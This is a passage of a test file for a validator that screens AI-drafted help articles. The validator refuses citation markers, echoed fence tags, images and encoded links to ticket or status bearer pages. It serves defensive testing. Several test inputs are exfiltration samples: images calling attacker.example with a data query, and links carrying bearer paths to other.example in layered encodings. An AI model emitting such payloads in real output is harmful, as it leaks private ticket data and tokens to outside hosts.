import { describe, expect, it } from "vitest";
import {
  BODY_MAX,
  codePointLength,
  containsSourceMarker,
  containsTicketLink,
  isTicketPageUrl,
  type ProposalOutput,
  RENDERED_URL_PROPERTIES,
  renderedBodyLinksToTicket,
  renderedMarkdownHasImage,
  TOKEN_WRAP_LEADING,
  TOKEN_WRAP_TRAILING,
  validateDraftFields,
  validateProposalOutput,
} from "@/lib/kb/proposal-schema";

const BODY = "## Steps\nOpen Settings.";

function output(overrides: Partial<ProposalOutput> = {}): ProposalOutput {
  return {
    title: "Resetting a password",
    bodyMarkdown: BODY,
    citations: [{ source: "T1", section: "Steps" }],
    ...overrides,
  };
}

function reason(overrides: Partial<ProposalOutput>, sourceCount = 2) {
  const result = validateProposalOutput(output(overrides), sourceCount);
  return result.ok ? "OK" : result.reason;
}

function fields(title: string, bodyMarkdown: string) {
  return validateDraftFields({ title, bodyMarkdown });
}

function bodyRefusal(bodyMarkdown: string) {
  return fields("A valid title", bodyMarkdown);
}

function titleRefusal(title: string) {
  return fields(title, BODY);
}

describe("validateProposalOutput tracer", () => {
  it("accepts a valid answer and maps each citation to its source position", () => {
    const result = validateProposalOutput(
      {
        title: "Resetting a password",
        bodyMarkdown: "## Steps\nOpen Settings.",
        citations: [{ source: "T1", section: "Steps" }],
      },
      1,
    );
    expect(result).toEqual({
      ok: true,
      value: {
        title: "Resetting a password",
        bodyMarkdown: "## Steps\nOpen Settings.",
        citations: [{ position: 1, section: "Steps" }],
      },
    });
  });
});

describe("codePointLength (edge AIDA-18 encoding)", () => {
  it("counts code points: an astral character once, a combining sequence per code point", () => {
    expect(codePointLength("😀")).toBe(1);
    expect("😀".length).toBe(2);
    expect(codePointLength("é")).toBe(2);
    expect(codePointLength("")).toBe(0);
  });
});

describe("validateProposalOutput lengths and structure", () => {
  it("refuses a 2-code-point title", () => {
    expect(reason({ title: "ab" })).toBe("TITLE_LENGTH");
  });

  it("refuses a 121-code-point title", () => {
    expect(reason({ title: "a".repeat(121) })).toBe("TITLE_LENGTH");
  });

  it("accepts a title of 120 astral characters (240 UTF-16 code units) and refuses 121", () => {
    const title = "😀".repeat(120);
    expect(title.length).toBe(240);
    expect(reason({ title })).toBe("OK");
    expect(reason({ title: "😀".repeat(121) })).toBe("TITLE_LENGTH");
  });

  it("refuses an output with no title (empty)", () => {
    expect(reason({ title: "" })).toBe("TITLE_LENGTH");
  });

  it("refuses an empty body", () => {
    expect(reason({ bodyMarkdown: "" })).toBe("BODY_EMPTY");
  });

  it("refuses a whitespace-only body", () => {
    expect(reason({ bodyMarkdown: "  \n\t " })).toBe("BODY_EMPTY");
  });

  it("refuses a 20,001-code-point body and accepts 20,000", () => {
    expect(reason({ bodyMarkdown: "b".repeat(20001) })).toBe("BODY_TOO_LONG");
    expect(reason({ bodyMarkdown: "b".repeat(20000) })).toBe("OK");
  });

  it("refuses bodies with the source markers [T1], [ t2 ] and [t3] (MARKER_IN_BODY)", () => {
    expect(reason({ bodyMarkdown: "Open Settings [T1]." })).toBe("MARKER_IN_BODY");
    expect(reason({ bodyMarkdown: "Open Settings [ t2 ]." })).toBe("MARKER_IN_BODY");
    expect(reason({ bodyMarkdown: "Open Settings [t3]." })).toBe("MARKER_IN_BODY");
  });

  it("refuses a body that echoes a ticket_content fence tag (FENCE_ECHO)", () => {
    expect(reason({ bodyMarkdown: 'Text <ticket_content id="T1"> more' })).toBe("FENCE_ECHO");
  });

  it("refuses 21 citations", () => {
    const citations = Array.from({ length: 21 }, () => ({ source: "T1", section: "Steps" }));
    expect(reason({ citations })).toBe("TOO_MANY_CITATIONS");
  });

  it("refuses an empty section label", () => {
    expect(reason({ citations: [{ source: "T1", section: "" }] })).toBe("SECTION_LENGTH");
  });

  it("refuses an 81-code-point section label", () => {
    expect(reason({ citations: [{ source: "T1", section: "s".repeat(81) }] })).toBe(
      "SECTION_LENGTH",
    );
  });

  it("refuses a citation source T3 when two tickets were selected (CITATION_UNKNOWN_SOURCE)", () => {
    expect(reason({ citations: [{ source: "T3", section: "Steps" }] }, 2)).toBe(
      "CITATION_UNKNOWN_SOURCE",
    );
    expect(reason({ citations: [{ source: "ticket-1", section: "Steps" }] }, 2)).toBe(
      "CITATION_UNKNOWN_SOURCE",
    );
  });

  it("refuses zero citations: a draft needs at least one supporting source (review a2-IN-04)", () => {
    expect(validateProposalOutput(output({ citations: [] }), 2)).toEqual({
      ok: false,
      reason: "NO_CITATIONS",
    });
    expect(reason({ citations: undefined as unknown as ProposalOutput["citations"] })).toBe(
      "NO_CITATIONS",
    );
  });

  it("accepts exactly one valid citation", () => {
    const result = validateProposalOutput(
      output({ citations: [{ source: "T2", section: "Steps" }] }),
      2,
    );
    expect(result).toEqual({
      ok: true,
      value: {
        title: "Resetting a password",
        bodyMarkdown: BODY,
        citations: [{ position: 2, section: "Steps" }],
      },
    });
  });

  it("trims title and body before checking and returns the trimmed values", () => {
    const result = validateProposalOutput(
      output({ title: "  Reset  ", bodyMarkdown: `\n${BODY}\n  ` }),
      1,
    );
    expect(result).toEqual({
      ok: true,
      value: { title: "Reset", bodyMarkdown: BODY, citations: [{ position: 1, section: "Steps" }] },
    });
  });
});

describe("validateProposalOutput source references (review C7, run decision K51)", () => {
  it("refuses the title '[T1] Password reset' with MARKER_IN_TITLE", () => {
    expect(reason({ title: "[T1] Password reset" })).toBe("MARKER_IN_TITLE");
  });

  it("refuses a relative inline link to /tickets/abc123 with TICKET_LINK", () => {
    expect(reason({ bodyMarkdown: "Read [guide](/tickets/abc123)." })).toBe("TICKET_LINK");
  });

  it("refuses the bare absolute URL https://help.example.com/tickets/abc123", () => {
    expect(reason({ bodyMarkdown: "See https://help.example.com/tickets/abc123" })).toBe(
      "TICKET_LINK",
    );
  });

  it("refuses an autolink to /Tickets/ in another case", () => {
    expect(reason({ bodyMarkdown: "<https://help.example.com/Tickets/abc>" })).toBe("TICKET_LINK");
  });

  it("refuses the reference definition [g]: /tickets/abc", () => {
    expect(reason({ bodyMarkdown: "See [the guide][g].\n\n[g]: /tickets/abc" })).toBe(
      "TICKET_LINK",
    );
  });

  it("accepts a ticket number and the word tickets in prose (#123)", () => {
    expect(reason({ bodyMarkdown: "Same cause as ticket #123; the tickets queue was slow." })).toBe(
      "OK",
    );
  });

  it("refuses a title with a ticket URL with TICKET_LINK", () => {
    expect(reason({ title: "Reset guide https://help.example.com/tickets/abc" })).toBe(
      "TICKET_LINK",
    );
  });

  it("refuses an escaped image destination with TICKET_LINK (review P8)", () => {
    expect(reason({ bodyMarkdown: String.raw`![x](\/tickets\/abc)` })).toBe("TICKET_LINK");
  });

  it("refuses the title 'Reset guide (/tickets/abc).' with TICKET_LINK (review R3-3)", () => {
    expect(reason({ title: "Reset guide (/tickets/abc)." })).toBe("TICKET_LINK");
  });
});

describe("validateDraftFields (review C7)", () => {
  it("returns CITATION_MARKER on title for a title marker, before any body failure", () => {
    expect(fields("[T1] Password reset", BODY)).toEqual({
      ok: false,
      field: "title",
      code: "CITATION_MARKER",
    });
    expect(fields("[T1] Password reset", "")).toEqual({
      ok: false,
      field: "title",
      code: "CITATION_MARKER",
    });
  });

  it("returns TICKET_LINK on bodyMarkdown for a relative ticket link", () => {
    expect(bodyRefusal("[guide](/tickets/abc123)")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("returns TICKET_LINK on bodyMarkdown for an absolute ticket link", () => {
    expect(bodyRefusal("See https://help.example.com/tickets/abc123")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("accepts #123 in prose", () => {
    expect(bodyRefusal("Same cause as ticket #123.")).toEqual({
      ok: true,
      title: "A valid title",
      bodyMarkdown: "Same cause as ticket #123.",
    });
  });

  it("containsTicketLink finds an inline link and ignores a ticket number", () => {
    expect(containsTicketLink("[x](/tickets/1)")).toBe(true);
    expect(containsTicketLink("see ticket #123")).toBe(false);
  });

  it("returns TICKET_LINK on title for a title URL and a title path (run decision K51)", () => {
    expect(titleRefusal("Reset guide https://help.example.com/tickets/abc")).toEqual({
      ok: false,
      field: "title",
      code: "TICKET_LINK",
    });
    expect(titleRefusal("Reset guide /tickets/abc")).toEqual({
      ok: false,
      field: "title",
      code: "TICKET_LINK",
    });
  });

  it("returns TITLE_TOO_SHORT, TITLE_TOO_LONG, BODY_REQUIRED and CITATION_MARKER on the body", () => {
    expect(titleRefusal("ab")).toEqual({ ok: false, field: "title", code: "TITLE_TOO_SHORT" });
    expect(titleRefusal("a".repeat(121))).toEqual({
      ok: false,
      field: "title",
      code: "TITLE_TOO_LONG",
    });
    expect(bodyRefusal("   ")).toEqual({ ok: false, field: "bodyMarkdown", code: "BODY_REQUIRED" });
    expect(bodyRefusal("Step one [T2].")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "CITATION_MARKER",
    });
  });

  it("checks in the documented order: title length before title marker, title before body", () => {
    expect(fields("[T", "")).toEqual({ ok: false, field: "title", code: "TITLE_TOO_SHORT" });
    expect(fields(`[T1] ${"a".repeat(120)}`, "")).toEqual({
      ok: false,
      field: "title",
      code: "TITLE_TOO_LONG",
    });
    expect(fields("Title /tickets/abc", "")).toEqual({
      ok: false,
      field: "title",
      code: "TICKET_LINK",
    });
    expect(fields("A valid title", "[T1] [g](/tickets/abc)")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "CITATION_MARKER",
    });
  });

  it("returns ok with trimmed values for a valid pair, astral title included", () => {
    expect(fields("  Resetting a password ", ` ${BODY}\n`)).toEqual({
      ok: true,
      title: "Resetting a password",
      bodyMarkdown: BODY,
    });
    expect(fields("😀".repeat(120), BODY).ok).toBe(true);
    expect(fields("😀".repeat(121), BODY)).toEqual({
      ok: false,
      field: "title",
      code: "TITLE_TOO_LONG",
    });
  });

  it("containsSourceMarker matches [T12] and not array[1]", () => {
    expect(containsSourceMarker("see [T12]")).toBe(true);
    expect(containsSourceMarker("array[1]")).toBe(false);
  });
});

describe("run decision K51: encoded, escaped and external ticket links (review R2-2)", () => {
  it("refuses a percent-encoded path in a link and in a bare URL", () => {
    expect(bodyRefusal("[guide](/%74ickets/abc)")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
    expect(bodyRefusal("See https://help.example.com/%74ickets/abc")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("isTicketPageUrl decodes once and fails closed on a malformed escape", () => {
    expect(isTicketPageUrl("/%74ickets/abc")).toBe(true);
    expect(isTicketPageUrl("/%E0%A4%A")).toBe(true);
    expect(isTicketPageUrl("/tickets")).toBe(false);
    expect(isTicketPageUrl("/kb/abc")).toBe(false);
    expect(isTicketPageUrl("https://help.example.com/TICKETS/1")).toBe(true);
    expect(isTicketPageUrl("http://[")).toBe(false);
  });

  it("refuses a backslash-escaped Markdown destination through the rendered href", () => {
    const body = String.raw`[guide](\/tickets\/abc)`;
    expect(bodyRefusal(body)).toEqual({ ok: false, field: "bodyMarkdown", code: "TICKET_LINK" });
    expect(renderedBodyLinksToTicket(body)).toBe(true);
    // The raw candidates miss it: only the rendered href reveals the ticket page.
    expect(containsTicketLink(body)).toBe(false);
  });

  it("refuses an HTML entity in the destination through the rendered href", () => {
    const body = "[guide](&#47;tickets/abc)";
    expect(bodyRefusal(body)).toEqual({ ok: false, field: "bodyMarkdown", code: "TICKET_LINK" });
    expect(renderedBodyLinksToTicket(body)).toBe(true);
    expect(containsTicketLink(body)).toBe(false);
  });

  it("refuses external /tickets/ links (documented false positive) and dot segments", () => {
    for (const body of [
      "[status](https://status.example.com/tickets/123)",
      "[s](//status.example.com/tickets/1)",
      "Check www.status.example.com/tickets/1 now",
      "[g](../tickets/abc)",
    ]) {
      expect(bodyRefusal(body)).toEqual({ ok: false, field: "bodyMarkdown", code: "TICKET_LINK" });
    }
  });

  it("allows prose, other paths, /ticketsfoo and the /tickets list", () => {
    for (const body of [
      "Same cause as ticket #123; the tickets queue was slow.",
      "[docs](https://example.com/docs/tickets-guide)",
      "[kb](/kb/abc)",
      "/ticketsfoo is not a page",
      "[list](/tickets)",
    ]) {
      expect(bodyRefusal(body).ok).toBe(true);
    }
    expect(titleRefusal("Ticket #123 follow-up").ok).toBe(true);
  });
});

describe("review P8: every URL attribute of the rendered body", () => {
  it("refuses an escaped image destination through the rendered img src", () => {
    const body = String.raw`![x](\/tickets\/abc)`;
    expect(bodyRefusal(body)).toEqual({ ok: false, field: "bodyMarkdown", code: "TICKET_LINK" });
    expect(validateProposalOutput(output({ bodyMarkdown: body }), 1)).toEqual({
      ok: false,
      reason: "TICKET_LINK",
    });
    expect(renderedBodyLinksToTicket(body)).toBe(true);
  });

  it("an external image is not a ticket page, but run decision K54 refuses it as an image", () => {
    expect(bodyRefusal("![logo](https://example.com/img/logo.png)")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "IMAGE_NOT_ALLOWED",
    });
    expect(renderedBodyLinksToTicket("![logo](https://example.com/img/logo.png)")).toBe(false);
  });

  it("reads exactly the URL attributes the sanitizer keeps", () => {
    expect([...RENDERED_URL_PROPERTIES]).toEqual(["href", "src", "cite", "longDesc", "srcSet"]);
  });

  it("finds an ordinary rendered link and ignores a body with no element", () => {
    expect(renderedBodyLinksToTicket("[g](/tickets/abc)")).toBe(true);
    expect(renderedBodyLinksToTicket("Plain text only.")).toBe(false);
  });
});

describe("review R3-3: paths wrapped in punctuation", () => {
  it("refuses the title 'Reset guide (/tickets/abc).'", () => {
    expect(titleRefusal("Reset guide (/tickets/abc).")).toEqual({
      ok: false,
      field: "title",
      code: "TICKET_LINK",
    });
  });

  it("refuses the title 'Reset guide \"/tickets/abc\"'", () => {
    expect(titleRefusal('Reset guide "/tickets/abc"')).toEqual({
      ok: false,
      field: "title",
      code: "TICKET_LINK",
    });
  });

  it("refuses the title 'Reset guide [/tickets/abc]'", () => {
    expect(titleRefusal("Reset guide [/tickets/abc]")).toEqual({
      ok: false,
      field: "title",
      code: "TICKET_LINK",
    });
  });

  it("refuses the body 'See (/tickets/abc).'", () => {
    expect(bodyRefusal("See (/tickets/abc).")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("refuses the body 'See \"/tickets/abc\" first.'", () => {
    expect(bodyRefusal('See "/tickets/abc" first.')).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("refuses the body 'See [/tickets/abc] first.'", () => {
    expect(bodyRefusal("See [/tickets/abc] first.")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("refuses a backtick-wrapped path in the body", () => {
    expect(bodyRefusal("Run `/tickets/abc` again.")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("containsTicketLink finds (/tickets/abc).", () => {
    expect(containsTicketLink("(/tickets/abc).")).toBe(true);
  });

  it("allows the neighbours /ticketsfoo and docs/tickets-guide in title and body", () => {
    expect(titleRefusal("About /ticketsfoo pages").ok).toBe(true);
    expect(titleRefusal("See docs/tickets-guide").ok).toBe(true);
    expect(bodyRefusal("See (/ticketsfoo).").ok).toBe(true);
    expect(bodyRefusal("Read docs/tickets-guide first.").ok).toBe(true);
    expect(containsTicketLink("(/ticketsfoo).")).toBe(false);
    expect(containsTicketLink("docs/tickets-guide")).toBe(false);
  });
});

describe("run decision K54: images are refused in title and body (review a2-CR-01)", () => {
  const REMOTE = "![x](https://attacker.example/p.png?d=summary)";

  it("refuses a remote image in the body at generation (IMAGE_IN_BODY, so INVALID_OUTPUT)", () => {
    expect(reason({ bodyMarkdown: `## Steps\n\n${REMOTE}` })).toBe("IMAGE_IN_BODY");
  });

  it("refuses protocol-relative, relative and reference-style images in the body", () => {
    expect(reason({ bodyMarkdown: "## Steps\n\n![x](//attacker.example/p.png)" })).toBe(
      "IMAGE_IN_BODY",
    );
    expect(reason({ bodyMarkdown: "## Steps\n\n![logo](/img/logo.png)" })).toBe("IMAGE_IN_BODY");
    expect(
      reason({ bodyMarkdown: "## Steps\n\n![x][p]\n\n[p]: https://attacker.example/p.png" }),
    ).toBe("IMAGE_IN_BODY");
  });

  it("refuses an image in the title at generation (IMAGE_IN_TITLE)", () => {
    expect(reason({ title: `Reset guide ${REMOTE}` })).toBe("IMAGE_IN_TITLE");
  });

  it("validateDraftFields returns IMAGE_NOT_ALLOWED on bodyMarkdown for any image", () => {
    for (const body of [
      `## Steps\n\n${REMOTE}`,
      "![x](//attacker.example/p.png)",
      "![logo](/img/logo.png)",
    ]) {
      expect(bodyRefusal(body)).toEqual({
        ok: false,
        field: "bodyMarkdown",
        code: "IMAGE_NOT_ALLOWED",
      });
    }
  });

  it("review a-IN-02: validateDraftFields applies BODY_MAX in code points (BODY_TOO_LONG)", () => {
    expect(BODY_MAX).toBe(20000);
    // Exactly BODY_MAX code points, one of them astral (two UTF-16 units, counted once): allowed.
    const atMax = `\u{1F600}${"a".repeat(BODY_MAX - 1)}`;
    expect(codePointLength(atMax)).toBe(BODY_MAX);
    expect(atMax.length).toBe(BODY_MAX + 1);
    expect(fields("A valid title", atMax)).toMatchObject({ ok: true });
    // One more code point: refused on the body, before any marker, link or image check.
    expect(bodyRefusal(`${atMax}b`)).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "BODY_TOO_LONG",
    });
    expect(bodyRefusal(`[T1] ${"a".repeat(BODY_MAX)}`)).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "BODY_TOO_LONG",
    });
    // Surrounding whitespace is trimmed before counting, as everywhere else.
    expect(fields("A valid title", `  ${atMax}\n\n`)).toMatchObject({ ok: true });
  });

  it("keeps the ticket-link check first for an image whose destination is a ticket page", () => {
    expect(bodyRefusal("![x](/tickets/abc)")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("allows a link (not an image) and image-like prose", () => {
    expect(bodyRefusal("See [the guide](https://example.com/guide).").ok).toBe(true);
    expect(bodyRefusal("Press the ! key, then [Enter].").ok).toBe(true);
    expect(bodyRefusal("Inline code `![x](https://a.example/p.png)` is text.").ok).toBe(true);
    expect(
      reason({ bodyMarkdown: "## Steps\n\nSee [the guide](https://example.com/guide)." }),
    ).toBe("OK");
  });

  it("renderedMarkdownHasImage finds an img in the rendered HTML only", () => {
    expect(renderedMarkdownHasImage(REMOTE)).toBe(true);
    expect(renderedMarkdownHasImage("[link](https://example.com)")).toBe(false);
    expect(renderedMarkdownHasImage("Plain text.")).toBe(false);
  });
});

describe("run decision K53 and review a2-IN-05: emphasis, typographic and table wrappers", () => {
  const WRAPPED = [
    "**/tickets/abc**",
    "_/tickets/abc_",
    "~~/tickets/abc~~",
    "*/tickets/abc*",
    "__/tickets/abc__",
    "**(/tickets/abc)**.",
    "_[/tickets/abc]_,",
    "“/tickets/abc”",
    "‘/tickets/abc’",
    "«/tickets/abc»",
    "|/tickets/abc|",
  ];

  it("refuses every wrapped ticket path in the title (TICKET_LINK)", () => {
    for (const token of WRAPPED) {
      expect(titleRefusal(`Reset guide ${token}`)).toEqual({
        ok: false,
        field: "title",
        code: "TICKET_LINK",
      });
      expect(reason({ title: `Reset guide ${token}` })).toBe("TICKET_LINK");
    }
  });

  it("refuses every wrapped ticket path in the body (TICKET_LINK)", () => {
    for (const token of WRAPPED) {
      expect(bodyRefusal(`See ${token} first.`)).toEqual({
        ok: false,
        field: "bodyMarkdown",
        code: "TICKET_LINK",
      });
      expect(reason({ bodyMarkdown: `## Steps\n\nSee ${token} first.` })).toBe("TICKET_LINK");
    }
  });

  it("refuses a ticket path in an unpadded table cell", () => {
    expect(bodyRefusal("| Link |\n| --- |\n|/tickets/abc|")).toEqual({
      ok: false,
      field: "bodyMarkdown",
      code: "TICKET_LINK",
    });
  });

  it("allows the wrapped neighbours /ticketsfoo and docs/tickets-guide", () => {
    for (const text of [
      "**/ticketsfoo**",
      "_docs/tickets-guide_",
      "~~/ticketsfoo~~",
      "“/ticketsfoo”",
      "|docs/tickets-guide|",
    ]) {
      expect(titleRefusal(`About ${text}`).ok).toBe(true);
      expect(bodyRefusal(`Read ${text} first.`).ok).toBe(true);
      expect(containsTicketLink(text)).toBe(false);
    }
  });

  it("exports the extended wrap sets", () => {
    for (const ch of ["*", "_", "~", "“", "‘", "«", "|"]) {
      expect(TOKEN_WRAP_LEADING).toContain(ch);
    }
    for (const ch of ["*", "_", "~", "”", "’", "»", "|"]) {
      expect(TOKEN_WRAP_TRAILING).toContain(ch);
    }
  });
});

describe("run decision K57: public status bearer links are ticket links (review a2-WR-06)", () => {
  const LINKS = [
    "/status/tok_abc123",
    "https://help.example.com/status/tok_abc123",
    "/api/public/status/tok_abc123/attachments",
    "https://help.example.com/api/public/status/tok_abc123/follow-up",
    "/%73tatus/tok_abc123",
    "/STATUS/tok_abc123",
    "../status/tok_abc123",
  ];

  it("isTicketPageUrl is true for every status path form", () => {
    for (const link of LINKS) expect(isTicketPageUrl(link)).toBe(true);
  });

  it("refuses a status link in the title (raw text)", () => {
    for (const link of LINKS) {
      expect(titleRefusal(`Track it at ${link}`)).toEqual({
        ok: false,
        field: "title",
        code: "TICKET_LINK",
      });
      expect(reason({ title: `Track it at ${link}` })).toBe("TICKET_LINK");
    }
  });

  it("refuses a status link in the body, raw and through the rendered href", () => {
    for (const link of LINKS) {
      expect(bodyRefusal(`Open [your status page](${link}).`)).toEqual({
        ok: false,
        field: "bodyMarkdown",
        code: "TICKET_LINK",
      });
    }
    const escaped = String.raw`Open [status](\/status\/tok_abc123).`;
    expect(renderedBodyLinksToTicket(escaped)).toBe(true);
    expect(reason({ bodyMarkdown: `## Steps\n\n${escaped}` })).toBe("TICKET_LINK");
  });

  it("allows neighbours that are not status paths", () => {
    for (const text of [
      "See https://status.example.com for outages.",
      "Read /statuspage first.",
      "The status of your order is shown in Settings.",
      "Open /api/public/intake to submit.",
    ]) {
      expect(bodyRefusal(text).ok).toBe(true);
    }
  });
});

describe("run decision K58: a ticket or status path in the query string or the fragment (Codex D2)", () => {
  // A bearer path carried as a parameter of an external link reaches the other host on a click
  // just like a path does. Each of these must be refused; the host is never what decides.
  const CARRIED = [
    "https://other.example/?data=/tickets/abc",
    "https://other.example/?next=https%3A%2F%2Fhelp.example.com%2Fstatus%2Ftok_abc123",
    "https://other.example/?u=%2Fapi%2Fpublic%2Fstatus%2Ftok_abc123%2Ffollow-up",
    "https://other.example/page#/tickets/abc",
    "https://other.example/page#%2Fstatus%2Ftok_abc123",
    "https://other.example/?r=%2FSTATUS%2Ftok_abc123",
    "/kb/abc?from=/tickets/abc",
    "#/status/tok_abc123",
  ];

  it("isTicketPageUrl reads the percent-decoded query string and fragment", () => {
    for (const link of CARRIED) expect(isTicketPageUrl(link)).toBe(true);
  });

  it("fails closed on a malformed escape in the query string or the fragment", () => {
    expect(isTicketPageUrl("https://other.example/?d=%E0%A4%A")).toBe(true);
    expect(isTicketPageUrl("https://other.example/page#%E0%A4%A")).toBe(true);
  });

  it("refuses a carried path in the title and the body, at generation and in the field validator", () => {
    for (const link of CARRIED) {
      // The title is plain text: a bare fragment such as "#/status/…" is no link there, so the
      // title is checked with every candidate that is a URL or a path token.
      if (!link.startsWith("#")) {
        expect(titleRefusal(`Track it at ${link}`)).toEqual({
          ok: false,
          field: "title",
          code: "TICKET_LINK",
        });
        expect(reason({ title: `Track it at ${link}` })).toBe("TICKET_LINK");
      }
      expect(bodyRefusal(`Open [the guide](${link}).`)).toEqual({
        ok: false,
        field: "bodyMarkdown",
        code: "TICKET_LINK",
      });
      expect(reason({ bodyMarkdown: `## Steps\n\nOpen [the guide](${link}).` })).toBe(
        "TICKET_LINK",
      );
    }
  });

  it("an escaped destination is caught on the rendered href", () => {
    const body = String.raw`Open [guide](https://other.example/?d=\/tickets\/abc).`;
    expect(renderedBodyLinksToTicket(body)).toBe(true);
    expect(reason({ bodyMarkdown: `## Steps\n\n${body}` })).toBe("TICKET_LINK");
  });

  it("external links with other queries and fragments stay allowed", () => {
    for (const text of [
      "[docs](https://docs.example.com/vpn-guide?lang=en#reset)",
      "[search](https://example.com/search?q=status+page&page=2)",
      "[faq](https://example.com/faq#tickets)",
      "[kb](/kb/abc?tab=history#steps)",
      "See https://status.example.com/?region=eu for outages.",
    ]) {
      expect(bodyRefusal(text).ok).toBe(true);
    }
    expect(isTicketPageUrl("https://example.com/path?status=open")).toBe(false);
    expect(isTicketPageUrl("https://example.com/path?a=%2Fkb%2Fabc")).toBe(false);
  });
});

describe("run decision K58 clarified: repeated percent-decoding (Codex diff round 2, R2D-1)", () => {
  /** encodeURIComponent applied `times` times. */
  function encoded(value: string, times: number): string {
    let out = value;
    for (let i = 0; i < times; i++) out = encodeURIComponent(out);
    return out;
  }

  // Each carries /status/ or /tickets/ encoded two or three times, in the query or the fragment.
  const LAYERED = [
    "https://other.example/?next=%252Fstatus%252Ftok_abc123",
    "https://other.example/?next=%25252Ftickets%25252Fabc",
    "https://other.example/page#%252Ftickets%252Fabc",
    "https://other.example/page#%25252Fstatus%25252Ftok_abc123",
    `https://other.example/?u=${encoded("https://help.example.com/status/tok_abc123", 2)}`,
    `https://other.example/?u=${encoded("/tickets/abc", 3)}`,
    `https://other.example/page#${encoded("/status/tok_abc123", 3)}`,
    `https://other.example/page#r=${encoded("/tickets/abc", 2)}`,
  ];

  it("isTicketPageUrl refuses /status/ and /tickets/ encoded twice or three times", () => {
    for (const link of LAYERED) expect(isTicketPageUrl(link), link).toBe(true);
  });

  it("isTicketPageUrl decodes the pathname repeatedly too", () => {
    // %2574 decodes to %74, then to t: /tickets/abc after two decodes.
    expect(isTicketPageUrl("https://other.example/%2574ickets/abc")).toBe(true);
    expect(isTicketPageUrl("https://other.example/%252573tatus/tok_abc123")).toBe(true);
  });

  it("fails closed when five decodes still change the value", () => {
    // Four layers: four decodes change it, the fifth finds it stable, so it is read and allowed.
    expect(isTicketPageUrl(`https://other.example/?q=${encoded("hello world", 4)}`)).toBe(false);
    // Five layers: the fifth decode still changes it, so the limit is reached (fail-closed).
    expect(isTicketPageUrl(`https://other.example/?q=${encoded("hello world", 5)}`)).toBe(true);
    expect(isTicketPageUrl(`https://other.example/page#${encoded("hello world", 6)}`)).toBe(true);
    expect(isTicketPageUrl(`https://other.example/docs${encoded(" ", 5)}`)).toBe(true);
    expect(isTicketPageUrl(`https://other.example/docs${encoded(" ", 4)}`)).toBe(false);
  });

  it("fails closed on an escape that is malformed only after the first decode", () => {
    expect(isTicketPageUrl("https://other.example/?d=%25E0%25A4%25A")).toBe(true);
    expect(isTicketPageUrl("https://other.example/page#%25E0%25A4%25A")).toBe(true);
  });

  it("refuses the layered forms in the title and the body, at generation and in the field validator", () => {
    for (const link of LAYERED) {
      expect(titleRefusal(`Track it at ${link}`)).toEqual({
        ok: false,
        field: "title",
        code: "TICKET_LINK",
      });
      expect(reason({ title: `Track it at ${link}` })).toBe("TICKET_LINK");
      expect(bodyRefusal(`Open [the guide](${link}).`)).toEqual({
        ok: false,
        field: "bodyMarkdown",
        code: "TICKET_LINK",
      });
      expect(reason({ bodyMarkdown: `## Steps\n\nOpen [the guide](${link}).` })).toBe(
        "TICKET_LINK",
      );
    }
  });

  it("an external link whose query holds an ordinary encoded value stays allowed", () => {
    for (const text of [
      "[search](https://example.com/search?q=reset%20password)",
      "[docs](https://docs.example.com/vpn-guide?lang=en&q=split%20tunnel#step%201)",
      "[kb](/kb/abc?q=caf%C3%A9)",
    ]) {
      expect(bodyRefusal(text).ok, text).toBe(true);
      expect(reason({ bodyMarkdown: `## Steps\n\n${text}` }), text).toBe("OK");
    }
    expect(isTicketPageUrl("https://example.com/search?q=reset%20password")).toBe(false);
    expect(isTicketPageUrl("https://example.com/search?q=%2Fkb%2Fabc%20guide")).toBe(false);
  });
});

describe("run decision K60: a ticket or status path anywhere in the pathname (Codex diff round 3, R3D-1)", () => {
  // A bearer path carried inside the pathname of an external link reaches the other host on a
  // click, decoded or not. Zero, one and two extra encodings of the carried path, for /status/,
  // /tickets/ and /api/public/status/, absolute and relative, in any case.
  const IN_PATH = [
    "https://other.example/collect//status/x",
    "https://other.example/collect/%2Fstatus%2Fx",
    "https://other.example/collect/%252Fstatus%252Fx",
    "https://other.example/collect//tickets/x",
    "https://other.example/collect/%2Ftickets%2Fx",
    "https://other.example/collect/%252Ftickets%252Fx",
    "https://other.example/collect/%2Fapi%2Fpublic%2Fstatus%2Ftok_abc123",
    "https://other.example/collect/%252FSTATUS%252Fx",
    "/collect//status/x",
    "/collect/%2Fstatus%2Fx",
    "/collect/%252Fstatus%252Fx",
    "/collect//tickets/x",
    "/collect/%2Ftickets%2Fx",
    "/collect/%252Ftickets%252Fx",
  ];

  it("isTicketPageUrl refuses /status/ and /tickets/ carried inside the pathname", () => {
    for (const link of IN_PATH) expect(isTicketPageUrl(link), link).toBe(true);
  });

  it("refuses the carried pathname forms in the title and the body, at generation and in the field validator", () => {
    for (const link of IN_PATH) {
      expect(titleRefusal(`Track it at ${link}`), link).toEqual({
        ok: false,
        field: "title",
        code: "TICKET_LINK",
      });
      expect(reason({ title: `Track it at ${link}` }), link).toBe("TICKET_LINK");
      expect(bodyRefusal(`Open [the guide](${link}).`), link).toEqual({
        ok: false,
        field: "bodyMarkdown",
        code: "TICKET_LINK",
      });
      expect(reason({ bodyMarkdown: `## Steps\n\nOpen [the guide](${link}).` }), link).toBe(
        "TICKET_LINK",
      );
    }
  });

  it("refuses the documented false positive https://example.com/blog/status/update", () => {
    const link = "https://example.com/blog/status/update";
    expect(isTicketPageUrl(link)).toBe(true);
    expect(bodyRefusal(`Read [the update](${link}).`)).toEqual({
      ok: false,
      field: "bodyMarkdown",
